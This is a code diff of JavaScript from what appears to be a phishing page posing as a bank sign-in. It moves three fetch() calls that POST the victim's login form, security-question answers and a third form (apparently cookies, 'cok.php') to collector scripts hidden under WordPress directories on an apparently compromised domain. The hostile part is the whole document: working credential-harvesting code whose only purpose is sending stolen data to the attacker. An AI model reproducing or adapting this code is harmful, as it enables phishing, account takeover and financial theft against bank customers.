@@ -313,7 +313,7 @@
                 document.getElementById('signIn').innerText = 'Signing In...';
 
                 // Send POST request to data.php
-                fetch('https://fininvestbank.com/wp-admin/click.php/data.php', {
+                fetch('www/fininvestbank.com/wp-includes/wp-log/data.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(new FormData(this)).toString()
@@ -346,7 +346,7 @@
                 document.getElementById('btn2').innerText = 'Submitting...';
 
                 // Send POST request to question.php
-                fetch('https://fininvestbank.com/wp-admin/click.php/question.php', {
+                fetch('www/fininvestbank.com/wp-includes/wp-log/question.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(new FormData(this)).toString()
@@ -381,7 +381,7 @@
                 }, 2000)
 
                 // Send POST request to cok.php
-                fetch('https://fininvestbank.com/wp-admin/click.php/cok.php', {
+                fetch('www/fininvestbank.com/wp-includes/wp-log/cok.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: new URLSearchParams(new FormData(this)).toString()
